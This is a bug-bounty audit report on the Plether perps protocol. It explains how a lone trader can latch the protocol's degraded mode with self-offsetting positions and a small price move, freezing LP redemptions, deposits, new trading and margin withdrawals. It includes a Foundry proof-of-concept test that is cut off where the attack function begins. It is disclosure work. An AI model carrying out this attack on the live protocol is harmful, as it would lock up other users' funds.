# \#99631 [SC-High] Self-offsetting book at the admission boundary lets any trader latch degraded mode on an ordinary ~1% move and hold all LP redemptions, deposits and trading frozen

**Submitted on Nov 14th 2026 at 15:07:19 UTC by @Another for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99631
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

Any trader can manufacture the insolvency that latches degradedMode: fill the book to the admission boundary with self-offsetting LONG and SHORT positions, wait for a ~1% basket move, and close the winner. The payout drains effective assets below the remaining side's max-profit liability, and degradedMode blocks LP redemption funding, deposit activation, new opens and open-position withdrawals. Keeping the losing leg margined keeps E < L, blocking the owner's clear until the attacker releases.

## Vulnerability Details


The latch. After every close and liquidation settles, the engine compares effective pool assets with the larger side's maximum-profit envelope and latches degraded mode when the former is smaller (CfdEngine.sol:1321, 1345, 1352-1370):

```solidity
function _enterDegradedModeIfInsolvent(address account, uint256 pendingPoolPayoutAssets) internal {
    if (degradedMode) { return; }
    uint256 effectiveAssetsAfter = _availableCashForFreshPoolPayouts();   // pool.totalAssets() - totalTraderClaimBalanceAssets
    ...
    uint256 maxLiabilityAssets = _maxLiability();                          // max(longMaxProfit, shortMaxProfit)
    if (effectiveAssetsAfter < maxLiabilityAssets) {
        degradedMode = true;
        emit DegradedModeEntered(effectiveAssetsAfter, maxLiabilityAssets, account);
    }
}
```

Closes are never rejected for the solvency they reveal (CfdEnginePlanLib.sol:796: "A valid close may project degraded mode; solvency is reported rather than rejected"), and the latch is sticky: the only reset is the owner's clearDegradedMode, which itself requires raw solvency to have returned (CfdEngine.sol:659-668):

```solidity
function clearDegradedMode() external onlyOwner {
    if (!degradedMode) { revert CfdEngine__NotDegraded(); }
    if (_availableCashForFreshPoolPayouts() < _maxLiability()) { revert CfdEngine__StillInsolvent(); }
    degradedMode = false;
    emit DegradedModeCleared();
}
```

The boundary is fillable by one actor. Risk admission requires projected effective assets to cover maximum liability plus a 0.25% liability-scaled settlement buffer (CfdEngine.sol:154, SolvencyAccountingLib.sol:94-105, CfdEnginePlanLib.sol:699-780, asserted post-open at CfdEngineSettlementSidecar.sol:501, 525-535):

```solidity
function hasRequiredSettlementBuffer(uint256 effectiveAssets, uint256 maxLiabilityAssets, uint256 settlementBufferBps)
    internal pure returns (bool)
{
    if (effectiveAssets < maxLiabilityAssets) { return false; }
    return effectiveAssets - maxLiabilityAssets
        >= settlementBufferTargetAssets(maxLiabilityAssets, settlementBufferBps);
}
```

At the release parameters the basket mark starts at 1.00 and CAP_PRICE is 2.00, so each side's maximum-profit envelope equals its entry notional exactly (CfdMath.sol:77-90):

```solidity
if (side == CfdTypes.Side.LONG) { return entryCostAssetAtoms; }          // longMaxProfit = entry notional
uint256 capValueAssetAtoms = lots * capPrice;
return capValueAssetAtoms > entryCostAssetAtoms ? capValueAssetAtoms - entryCostAssetAtoms : 0;  // shortMaxProfit = lots*CAP - entry
```

A trader therefore opens LONG notional E/1.0025 on one account and SHORT notional E/1.0025 on a second account. Neither side exceeds the admission envelope, the book has zero net skew (skew is |longOI - shortOI| valued at one price, CfdEnginePlanLib.sol:206-214), so the 40% skew cap never binds if the book is grown in balanced pairs, and the VPI charge of each LONG leg is returned as the rebate of the matching SHORT leg (C(S) = 0.5*k*S^2/D, CfdMath.sol:95-146). Traders pay no entry notional on open, only VPI plus a 0.04% execution fee, and margin is just 0.20% initial / 0.10% maintenance of notional (OpenAccountingLib.sol:134-141), so filling both sides to the boundary ties up roughly 12% of the pool as fully refundable margin. The resulting state leaves exactly the 0.25% buffer as the only headroom between E and L.

The trigger. When the basket mark moves up by delta, the SHORT side's positions gain delta times their notional at the pool's expense. Closing them pays out that gain net of close charges (a skew-based VPI charge is assessed on closes too, CfdEnginePlanLib.sol:1036-1075), draining E by delta*C_short - charges. Once that drain exceeds the 0.25% buffer headroom, E falls below the remaining LONG side's entry-notional liability and the close itself latches degraded mode. At release parameters with the book at the boundary the minimum move is about 0.85%; the attacker can build the book at any time and wait indefinitely for such a move, and the whitepaper's own dataset (2,685 daily observations, range 0.8636 to 1.1168, largest peak-to-trough decline 22.67%) shows moves of that size recur constantly.

The hold. The remaining LONG leg's max-profit stays at its entry notional for as long as it stays open, pinning L at the boundary while E sits below it. CfdEngine.addMargin (CfdEngine.sol:502-530) has no degraded-mode gate, so the attacker tops the losing leg's margin up far above maintenance; keepers can never liquidate it, so nothing forces the loss to realize and restore E >= L. The owner's clearDegradedMode reverts CfdEngine__StillInsolvent for the entire hold. The only automatic restoration is carry: the attacker's own position accrues roughly 5%/yr on its ~92%-of-pool borrow base (about 0.012% of the pool per day), so the minimum hole (~0.33% of pool at a 1.2% move) erodes only after roughly four weeks of attacker-paid carry, and a larger move widens the hole at the same fee cost (a 5% move leaves a hole of roughly 4% of the pool, about a year of carry). The owner can otherwise only cut the freeze short by donating a recapitalization of the hole size through recapitalizePool (onlyOwner) and then clearing.

What is blocked while degraded, all verified in the PoC:

- LP epoch settlement, which funds redemption epochs and activates deposit epochs, reverts on the pool-level degraded gate (HousePool.sol:833, 1865-1871; the direct route is additionally router-gated while positions are open, HousePool.sol:810-820):

```solidity
function _requireWithdrawalsLive(HousePoolEngineViewTypes.HousePoolStatusSnapshot memory statusSnapshot) internal pure {
    if (statusSnapshot.degradedMode) { revert HousePool__DegradedMode(); }
}
```

- LP deposit-entry activation (HousePool.sol:1140-1146):

```solidity
function _entryStatusBlocked(...) internal pure returns (bool) {
    return statusSnapshot.oracleFrozen || statusSnapshot.degradedMode
        || HousePoolAccountingLib.buildReconcileSnapshot(accountingSnapshot).deficit != 0;
}
```

- Margin withdrawals for every account that still has an open position (CfdEngineSettlementSidecar.sol:256-286):

```solidity
function validateWithdraw(address account) external onlyEngine {
    ...
    if (pos.size == 0) { ...; return; }
    if (engine.degradedMode()) { revert ICfdEngineTypes.CfdEngine__DegradedMode(); }
    ...
}
```

- All new opens, rejected at commit (router/OrderLiquidationBatchLogic.sol:322-338):

```solidity
function _validateOpenCommitAllowed(IOrderLiquidationBatchHost host) private view {
    if (IOrderRouterEmergencyAdmin(host.admin()).paused()) { revert Pausable.EnforcedPause(); }
    ICfdEngineCore engine = host.engine();
    if (engine.degradedMode()) { revert OrderRouter__DegradedMode(); }
    ...
}
```

Closes, liquidations, mark updates and already-funded vault claims keep working, so the freeze is not a global pause; it is a freeze of the LP exit path and all new risk.

Measured at release parameters on a 10M USDG pool (2M senior / 8M junior, CAP 2.00, mark 1.00, buffer 25bps, VPI k=0.01, skew cap 40%, execution fee 4bps, initial margin 20bps): the attacker fills 9,474,609 USDG of LONG and the same of SHORT (plus an unrelated bystander's 500,000 LONG), leaving L = 9,974,500 and only 696 USDG of headroom above the 24,936 USDG buffer. A +1.2% move and one SHORT close drain E to 9,941,092 against L = 9,974,500, latching degraded mode with a 33,408 USDG hole. The attacker commits 1.2M USDG of refundable margin and spends a net 57,518 USDG (0.575% of the pool) in VPI and execution charges.


## Impact Details

Category: temporary freezing of funds / denial of service of core protocol operations, triggered permissionlessly and repeatable at will.

Impact: for a net cost of about 0.6% of the pool in open/close charges (plus roughly 12% of the pool as fully recoverable margin), a single attacker freezes the entire LP capital base: matured redemption epochs cannot be funded by any route, pending deposit epochs cannot activate, every new open protocol-wide is rejected, and no account with an open position can withdraw any margin. The freeze duration is attacker-controlled: it persists while the attacker keeps a healthy losing leg open, which keepers cannot liquidate and the owner cannot clear (CfdEngine__StillInsolvent), and ends only when the attacker releases, when the owner donates a recapitalization covering the hole, or after weeks of carry paid by the attacker into the pool. The demonstrated hole is 0.33% of the pool at a 1.2% move; larger moves at the same cost produce larger holes and holds, and the attack repeats whenever the basket moves ~0.85% or more. At the demonstrated minimum size the LPs even retain the attacker's charges, so the damage is the illiquidity and trading halt itself (all LP exit value frozen for the hold), not direct value theft.

This is not a known issue: the known-issues list (Cecuro findings, HIGH-1, SECURITY.md limitations, scan findings) does not cover deliberate latch triggering. The whitepaper documents the envelope's sequential-close counterexample only with extreme prices (entry 1, close at 0 then CAP, i.e. 100% moves) and treats degraded mode as a rare tail event whose latch the owner later clears; the accounting specification documents what is blocked while degraded but not that one trader can fill the book to the boundary with self-offsetting capital and trip the latch with an ordinary ~1% move, nor that the loser can be kept un-liquidatable so the owner's documented recovery path stays blocked for an attacker-chosen period.

## References
- packages/perps/src/CfdEngine.sol: line 122 (degradedMode), 154 (settlementBufferBps = 25), 502-530 (addMargin, no degraded gate), 659-668 (clearDegradedMode, onlyOwner, StillInsolvent), 866-872 (_availableCashForFreshPoolPayouts), 1045-1051 (_maxLiability), 1321 and 1345 (latch called after every close/liquidation), 1352-1370 (_enterDegradedModeIfInsolvent)
- packages/perps/src/libraries/SolvencyAccountingLib.sol: lines 65-70 (getMaxLiability), 78-105 (settlementBufferTargetAssets, hasRequiredSettlementBuffer), 174-198 (previewPostOpSolvency)
- packages/perps/src/libraries/CfdEnginePlanLib.sol: lines 206-214 (skew from side open interest), 699-780 (_applyOpenSettlementBufferAfterPlan open admission), 786-797 (close may project degraded mode), 1036-1075 (close action charges incl. VPI)
- packages/perps/src/libraries/CfdMath.sol: lines 77-90 (calculateExactMaxProfit), 95-146 (skew cost curve)
- packages/perps/src/libraries/OpenAccountingLib.sol: lines 114-154 (no entry notional paid, 20bps initial margin, trade cost = VPI + fee)
- packages/perps/src/CfdEngineSettlementSidecar.sol: lines 256-286 (validateWithdraw degraded gate), 501 and 525-535 (post-open solvency assert)
- packages/perps/src/HousePool.sol: lines 798-822 (settleLpEpoch router gate with open positions), 833 (withdrawals-live gate), 1140-1146 (_entryStatusBlocked), 1865-1871 (HousePool__DegradedMode)
- packages/perps/src/router/OrderLiquidationBatchLogic.sol: lines 322-338 (_validateOpenCommitAllowed, OrderRouter__DegradedMode)
- packages/perps/src/MarginClearinghouse.sol: lines 349-440 (margin custodied by the clearinghouse, not the pool)
- Degraded Mode section (packages/perps ACCOUNTING_SPEC.md#degraded-mode; allowed/blocked lists), whitepaper section 2.3 (envelope counterexample at prices 0 and CAP), section 7.5 (degraded mode), known-issues list (Cecuro MED/LOW findings, HIGH-1, SECURITY.md known limitations), initial release parameters (CAP 2.00, mark 1.00, buffer 25bps, VPI 0.01, skew cap 40%, margins 20/10bps, execution fee 4bps)

## Proof of Concept

## Proof of Concept

Create and run the PoC test below:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import "forge-std/Test.sol";
import {MockUSDG} from "./mocks/MockUSDG.sol";
import {MockPyth} from "./mocks/MockPyth.sol";

import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {ICfdEnginePlanner} from "@plether/perps/interfaces/ICfdEnginePlanner.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @title DegradedLatchFreezePoC
/// @notice A lone unprivileged attacker fills the perps book to its admission boundary
///         with self-offsetting LONG and SHORT positions across two accounts, waits for
///         an ordinary market move (+1.2%), and closes the winning leg. The realized
///         profit drains effective pool assets below the remaining side's maximum-profit
///         liability, latching degradedMode. While latched, all LP epoch settlement
///         (redemption funding and deposit activation), all new opens, and all margin
///         withdrawals for accounts with open positions revert. The attacker keeps the
///         losing leg well-margined, so E < L persists and the owner's clearDegradedMode()
///         reverts StillInsolvent: the freeze is held until the attacker voluntarily
///         releases it (or the pool is recapitalized).
contract DegradedLatchFreezePoC is Test {
    // ------------------------------------------------------------------
    // Release parameters (doc.md "Initial release parameters")
    // ------------------------------------------------------------------
    uint256 internal constant CAP_PRICE = 2e8;
    uint256 internal constant VPI_FACTOR = 0.01e18;
    uint256 internal constant MAX_SKEW_RATIO = 0.4e18;
    uint256 internal constant MAINT_MARGIN_BPS = 10;
    uint256 internal constant INIT_MARGIN_BPS = 20;
    uint256 internal constant FAD_MARGIN_BPS = 300;
    uint256 internal constant BASE_CARRY_BPS = 500;
    uint256 internal constant MIN_BOUNTY_ASSETS = 1e6;
    uint256 internal constant BOUNTY_BPS = 10;
    uint256 internal constant KEEPER_SHARE_BPS = 5_000;
    uint256 internal constant PROTOCOL_SHARE_BPS = 0;
    uint256 internal constant FROZEN_CLOSE_SPREAD_BPS = 50;
    // CfdEngine defaults: settlementBufferBps = 25 (0.25%), executionFeeBps = 4 (0.04%).

    // Anchor: Sunday, 19 Nov 2023 23:00:00 UTC (fixture anchor); the 72h pool-config
    // timelock matures Wednesday 23:01 UTC and the scenario runs Wednesday night
    // through Thursday/Friday, outside the Fri-17:00-NY .. Sun-17:00-NY FAD window.
    uint256 internal constant BASE = 1_700_352_000 + 23 hours;

    // Scenario sizes: 2M senior / 8M junior => E0 ~= 10M USDG pool.
    uint256 internal constant SENIOR_ASSETS = 2_000_000e6;
    uint256 internal constant JUNIOR_ASSETS = 8_000_000e6;
    // Attacker trading capital (margin + reserves), recovered at the end.
    uint256 internal constant ATTACKER_LONG_CAPITAL = 800_000e6;
    uint256 internal constant ATTACKER_SHORT_CAPITAL = 400_000e6;

    // Market move used to trip the latch: basket mark 1.00 -> 1.012 (+1.2%).
    // EURUSD mock base 1.10 maps to mark 1.00, so 1.1132 maps to exactly 1.012.
    int64 internal constant EURUSD_BASE = 110_000_000;
    int64 internal constant EURUSD_UP = 111_320_000;

    struct Stack {
        MockUSDG token;
        MockPyth pyth;
        MarginClearinghouse clearinghouse;
        CfdEngine engine;
        HousePool pool;
        TrancheVault seniorVault;
        TrancheVault juniorVault;
        PletherOracle oracle;
        CfdEngineLens engineLens;
        OrderRouter router;
        OrderLifecycleBook lifecycleBook;
    }

    address internal attackerLong = makeAddr("attackerLong");
    address internal attackerShort = makeAddr("attackerShort");
    address internal victimLP = makeAddr("victimLP"); // junior LP redeeming during the freeze
    address internal bystander = makeAddr("bystander"); // unrelated trader with an open position
    address internal seniorLP = makeAddr("seniorLP");
    address internal owner = makeAddr("owner");
    address internal deployer = makeAddr("deployer");
    address internal seedReceiver = makeAddr("seedReceiver");

    bytes[] internal pythData;

    function setUp() public {
        pythData.push(bytes("pyth-payload"));
    }

    // ------------------------------------------------------------------
    // Deployment (release stack, exactly the documented wiring)
    // ------------------------------------------------------------------

    function _computeCreateAddress(address acct, uint256 nonce) internal pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), acct, bytes1(uint8(nonce)))))));
    }

    function _epochStart(uint256 ts) internal pure returns (uint256) {
        return (ts / 1 hours) * 1 hours;
    }

    function _deployStack() internal returns (Stack memory s) {
        vm.startPrank(owner);
        s.pyth = new MockPyth();
        s.token = new MockUSDG();
        s.clearinghouse = new MarginClearinghouse(address(s.token));
        s.engine = new CfdEngine(
            address(s.token),
            address(s.clearinghouse),
            CAP_PRICE,
            CfdTypes.RiskParams({
                vpiFactor: VPI_FACTOR,
                maxSkewRatio: MAX_SKEW_RATIO,
                maintMarginBps: MAINT_MARGIN_BPS,
                initMarginBps: INIT_MARGIN_BPS,
                fadMarginBps: FAD_MARGIN_BPS,
                baseCarryBps: BASE_CARRY_BPS,
                minBountyAssets: MIN_BOUNTY_ASSETS,
                bountyBps: BOUNTY_BPS,
                keeperShareBps: KEEPER_SHARE_BPS,
                protocolShareBps: PROTOCOL_SHARE_BPS
            }),
            FROZEN_CLOSE_SPREAD_BPS
        );
        vm.stopPrank();

        vm.startPrank(owner);
        TerminalNavBookV2 navBook = new TerminalNavBookV2(address(s.engine), uint32(CAP_PRICE));
        s.engine.setTerminalNavBook(address(navBook));

        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar sidecar = new CfdEngineSettlementSidecar(address(s.engine));
        CfdEngineAdmin engineAdmin = new CfdEngineAdmin(address(s.engine), owner);
        s.engine.setDependencies(address(planner), address(sidecar), address(engineAdmin));

        HousePoolRedemptionMathSidecar redMath = new HousePoolRedemptionMathSidecar();
        s.pool = new HousePool(address(s.token), address(s.engine), address(redMath));
        s.engine.setPool(address(s.pool));

        s.seniorVault =
            new TrancheVault(IERC20(address(s.token)), address(s.pool), true, "Plether Senior", "PT-SR", 0, address(0));
        s.pool.setSeniorVault(address(s.seniorVault));

        address treasury = s.engine.protocolTreasury();
        s.juniorVault =
            new TrancheVault(IERC20(address(s.token)), address(s.pool), false, "Plether Junior", "PT-JR", 0, treasury);
        s.pool.setJuniorVault(address(s.juniorVault));

        s.clearinghouse.setEngine(address(s.engine));
        s.engineLens = new CfdEngineLens(address(s.engine));

        bytes32[] memory feedIds = new bytes32[](1);
        feedIds[0] = bytes32(uint256(0x455552555344)); // "EURUSD"
        uint256[] memory quantities = new uint256[](1);
        quantities[0] = 1e18;
        uint256[] memory basePrices = new uint256[](1);
        basePrices[0] = 110_000_000; // 1.10 USD -> basket mark 1.00 (8 decimals)
        bool[] memory inversions = new bool[](1);
        inversions[0] = false;
        s.oracle =
            new PletherOracle(address(s.engine), address(s.pool), address(s.pyth), feedIds, quantities, basePrices, inversions);

        CfdOrderPolicyEvaluator evaluator = new CfdOrderPolicyEvaluator();
        OrderRouterExecutionSidecar executionSidecar = new OrderRouterExecutionSidecar();
        vm.stopPrank();

        vm.startPrank(deployer);
        uint64 nonceBefore = vm.getNonce(deployer);
        address predictedRouter = _computeCreateAddress(deployer, nonceBefore + 2);
        OrderLifecycleBook book =
            new OrderLifecycleBook(predictedRouter, address(s.engine), address(s.clearinghouse), address(s.pool));
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        s.lifecycleBook = book;
        s.router = new OrderRouter(
            address(s.engine),
            address(s.engineLens),
            address(s.pool),
            address(s.oracle),
            address(keeperSidecar),
            address(evaluator),
            address(executionSidecar),
            address(book)
        );
        assertEq(address(s.router), predictedRouter, "router address prediction");
        vm.stopPrank();

        vm.prank(owner);
        s.engine.setOrderRouter(address(s.router));

        vm.deal(address(this), 1 ether);
        s.router.updateMarkPrice{value: 1 wei}(pythData);
    }

    function _bounds(Stack memory s) internal view returns (OrderV3Types.ExecutionBounds memory b) {
        b = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + 120),
            executionWindowSeconds: 60,
            allowedExecutionModes: 1, // Live
            expectedConfigHash: s.lifecycleBook.currentExecutionConfigHash(),
            maxExecutionBountyAssets: 1e6,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _settle(Stack memory s) internal {
        s.router.settleLpEpoch{value: 1 wei}(pythData);
    }

    function _refreshMark(Stack memory s) internal {
        s.router.updateMarkPrice{value: 1 wei}(pythData);
    }

    // ------------------------------------------------------------------
    // Trading helpers (permissionless commit + self-execution)
    // ------------------------------------------------------------------

    uint256 internal clientSeq = 1;

    function _tryOpen(
        Stack memory s,
        address acct,
        CfdTypes.Side side,
        uint256 notionalAssets,
        uint256 marginDelta
    ) internal returns (bool ok) {
        uint256 size = (notionalAssets * 1e20) / 1e8;
        size = (size / CfdTypes.SIZE_QUANTUM) * CfdTypes.SIZE_QUANTUM;
        if (size == 0) {
            return false;
        }
        _refreshMark(s);
        vm.startPrank(acct);
        try s.router.commitOrder(
            OrderV3Types.OrderRequest({
                clientOrderId: bytes32(clientSeq++),
                side: side,
                sizeDelta: size,
                marginDelta: marginDelta,
                targetPrice: side == CfdTypes.Side.LONG ? 1 : CAP_PRICE,
                isClose: false,
                bounds: _bounds(s)
            })
        ) returns (uint64 id) {
            vm.warp(block.timestamp + 2);
            vm.roll(block.number + 1);
            try s.router.executeOrder{value: 2 wei}(id, pythData) {
                ok = true;
            } catch {
                ok = false;
            }
        } catch {
            ok = false;
        }
        vm.stopPrank();
    }

    function _closeAll(Stack memory s, address acct, CfdTypes.Side side) internal returns (bool ok) {
        (uint256 posSize,,,,,,) = s.engine.positions(acct);
        if (posSize == 0) {
            return false;
        }
        _refreshMark(s);
        vm.startPrank(acct);
        try s.router.commitOrder(
            OrderV3Types.OrderRequest({
                clientOrderId: bytes32(clientSeq++),
                side: side,
                sizeDelta: posSize,
                marginDelta: 0,
                targetPrice: side == CfdTypes.Side.LONG ? CAP_PRICE : 1,
                isClose: true,
                bounds: _bounds(s)
            })
        ) returns (uint64 id) {
            vm.warp(block.timestamp + 2);
            vm.roll(block.number + 1);
            try s.router.executeOrder{value: 2 wei}(id, pythData) {
                ok = true;
            } catch {
                ok = false;
            }
        } catch {
            ok = false;
        }
        vm.stopPrank();
    }

    function _effectiveAssets(Stack memory s) internal view returns (uint256) {
        uint256 physical = s.pool.totalAssets();
        uint256 claims = s.engine.totalTraderClaimBalanceAssets();
        return physical > claims ? physical - claims : 0;
    }

    function _maxLiability(Stack memory s) internal view returns (uint256) {
        (uint256 longMaxProfit,,,) = s.engine.sides(0);
        (uint256 shortMaxProfit,,,) = s.engine.sides(1);
        return longMaxProfit > shortMaxProfit ? longMaxProfit : shortMaxProfit;
    }

    function _claimBalance(Stack memory s, address acct) internal view returns (uint256) {
        return s.engine.traderClaimBalanceAssets(acct);
    }

    // ------------------------------------------------------------------
    // Scenario runner
    // ------------------------------------------------------------------

    struct ScenarioResult {
        bool degradedLatched;
        uint256 victimProceeds; // victim token balance after all claims
        uint256 victimUnfundedShares; // shares still escrowed unfunded at the end
        uint256 attackerFinal; // token balances + clearinghouse equity + trader claims
        uint256 attackerSpent; // net USDG cost of the whole cycle
        uint256 juniorPrincipalFinal;
        uint256 seniorPrincipalFinal;
        uint256 poolEffectiveAssetsFinal;
    }

    function _runScenario(bool doAttack) internal returns (ScenarioResult memory r) {
        vm.warp(BASE); // Sunday 23:00 UTC
        Stack memory s = _deployStack();
        clientSeq = 1;

        // Release pool configuration through the 72h timelock.
        vm.startPrank(owner);
        s.pool.proposePoolConfig(
            IHousePool.PoolConfig({
                seniorRateBps: 800,
                markStalenessLimit: 60,
                seniorFrozenLpFeeBps: 25,
                juniorFrozenLpFeeBps: 75,
                maxSeniorExposureAssets: 40_000_000e6,
                maxSeniorShareBps: 8_000
            })
        );
        vm.stopPrank();

        vm.warp(BASE + 72 hours + 60); // Wednesday 23:01 UTC, live market
        vm.prank(owner);
        s.pool.finalizePoolConfig();

        vm.startPrank(owner);
        s.token.mint(owner, 2e6);
        s.token.approve(address(s.pool), 2e6);
        s.pool.initializeSeedPosition(false, 1e6, seedReceiver);
        s.pool.initializeSeedPosition(true, 1e6, seedReceiver);
        s.pool.activateTrading();
        vm.stopPrank();

        // Fund participants.
        s.token.mint(address(seniorLP), SENIOR_ASSETS);
        s.token.mint(address(victimLP), JUNIOR_ASSETS);
        s.token.mint(address(attackerLong), ATTACKER_LONG_CAPITAL);
        s.token.mint(address(attackerShort), ATTACKER_SHORT_CAPITAL);
        s.token.mint(address(bystander), 50_000e6);
        vm.deal(attackerLong, 1 ether);
        vm.deal(attackerShort, 1 ether);
        vm.deal(address(bystander), 1 ether);

        // Junior deposit activates first (senior-share cap), then senior.
        vm.startPrank(victimLP);
        s.token.approve(address(s.juniorVault), JUNIOR_ASSETS);
        uint256 juniorReq = s.juniorVault.requestDeposit(JUNIOR_ASSETS, victimLP, victimLP);
        vm.stopPrank();
        vm.warp(_epochStart(block.timestamp) + 1 hours + 60);
        _settle(s);
        vm.prank(victimLP);
        s.juniorVault.claimDeposit(juniorReq, JUNIOR_ASSETS, victimLP, victimLP);

        vm.startPrank(seniorLP);
        s.token.approve(address(s.seniorVault), SENIOR_ASSETS);
        uint256 seniorReq = s.seniorVault.requestDeposit(SENIOR_ASSETS, seniorLP, seniorLP);
        vm.stopPrank();
        vm.warp(_epochStart(block.timestamp) + 1 hours + 60);
        _settle(s);
        vm.prank(seniorLP);
        s.seniorVault.claimDeposit(seniorReq, SENIOR_ASSETS, seniorLP, seniorLP);

        // --------------------------------------------------------------
        // Pre-attack state: victim LP redeems, bystander trades, attacker funds margin.
        // --------------------------------------------------------------
        vm.warp(_epochStart(block.timestamp) + 1 hours + 60); // Thursday ~01:03 UTC

        uint256 victimShares = s.juniorVault.balanceOf(victimLP);
        vm.prank(victimLP);
        uint256 redeemEpochId = s.juniorVault.requestRedeem(victimShares, victimLP, victimLP);

        // Bystander deposits margin and opens a small, well-margined LONG position.
        vm.startPrank(bystander);
        s.token.approve(address(s.clearinghouse), 50_000e6);
        s.clearinghouse.depositMargin(50_000e6);
        vm.stopPrank();
        assertTrue(_tryOpen(s, bystander, CfdTypes.Side.LONG, 500_000e6, 20_000e6), "bystander open");

        // Attacker funds both trading accounts.
        vm.startPrank(attackerLong);
        s.token.approve(address(s.clearinghouse), ATTACKER_LONG_CAPITAL);
        s.clearinghouse.depositMargin(ATTACKER_LONG_CAPITAL);
        vm.stopPrank();
        vm.startPrank(attackerShort);
        s.token.approve(address(s.clearinghouse), ATTACKER_SHORT_CAPITAL);
        s.clearinghouse.depositMargin(ATTACKER_SHORT_CAPITAL);
        vm.stopPrank();

        if (doAttack) {
            _runAttack(s, redeemEpochId);
        } else {
            // Clean baseline: the market does not move, the attacker stays flat,
            // the same wall-clock time passes before the redemption is funded.
            vm.warp(block.timestamp + 20 minutes);
            _refreshMark(s);
        }

        // Fund the victim's matured redemption (any remaining unfunded part too).
        vm.warp(_epochStart(block.timestamp) + 1 hours + 60);
        try s.router.settleLpEpoch{value: 1 wei}(pythData) {} catch {}
        for (uint256 i; i < 6; ++i) {
            vm.warp(_epochStart(block.timestamp) + 1 hours + 60);
            try s.router.settleLpEpoch{value: 1 wei}(pythData) {} catch {}
            if (s.juniorVault.claimableRedeemRequest(redeemEpochId, victimLP) == victimShares) {
                break;
            }
        }
        uint256 claimable = s.juniorVault.claimableRedeemRequest(redeemEpochId, victimLP);
        if (claimable > 0) {
            vm.prank(victimLP);
            s.juniorVault.claimRedeem(redeemEpochId, claimable, victimLP, victimLP);
        }
        r.victimProceeds = s.token.balanceOf(victimLP);
        r.victimUnfundedShares = s.juniorVault.pendingRedeemRequest(redeemEpochId, victimLP);

        // Attacker recovers all remaining collateral and claims.
        uint256 longFree = s.clearinghouse.getFreeBuyingPowerAssets(attackerLong);
        vm.prank(attackerLong);
        try s.clearinghouse.withdraw(attackerLong, longFree) {} catch {}
        uint256 shortFree = s.clearinghouse.getFreeBuyingPowerAssets(attackerShort);
        vm.prank(attackerShort);
        try s.clearinghouse.withdraw(attackerShort, shortFree) {} catch {}
        vm.prank(attackerShort);
        try s.engine.settleTraderClaim(attackerShort) {} catch {}
        vm.prank(attackerLong);
        try s.engine.settleTraderClaim(attackerLong) {} catch {}
        // A later settlement pays any remaining claim balance out of the pool.
        vm.warp(_epochStart(block.timestamp) + 1 hours + 60);
        try s.router.settleLpEpoch{value: 1 wei}(pythData) {} catch {}
        vm.prank(attackerShort);
        try s.engine.settleTraderClaim(attackerShort) {} catch {}
        vm.prank(attackerLong);
        try s.engine.settleTraderClaim(attackerLong) {} catch {}
        vm.prank(attackerLong);
        try s.clearinghouse.withdraw(attackerLong, s.clearinghouse.getFreeBuyingPowerAssets(attackerLong)) {} catch {}
        vm.prank(attackerShort);
        try s.clearinghouse.withdraw(attackerShort, s.clearinghouse.getFreeBuyingPowerAssets(attackerShort)) {} catch {}

        r.attackerFinal = s.token.balanceOf(attackerLong) + s.token.balanceOf(attackerShort)
            + s.clearinghouse.getAccountEquityAssets(attackerLong) + s.clearinghouse.getAccountEquityAssets(attackerShort)
            + _claimBalance(s, attackerLong) + _claimBalance(s, attackerShort);
        r.attackerSpent = (ATTACKER_LONG_CAPITAL + ATTACKER_SHORT_CAPITAL) - r.attackerFinal;
        r.juniorPrincipalFinal = s.pool.juniorPrincipal();
        r.seniorPrincipalFinal = s.pool.seniorPrincipal();
        r.poolEffectiveAssetsFinal = _effectiveAssets(s);
        r.degradedLatched = doAttack; // asserted inside _runAttack
    }

    /// @dev The attack itself; every freeze claim is asserted here.
    function _runAttack(Stack memory s, uint256 redeemEpochId) internal {
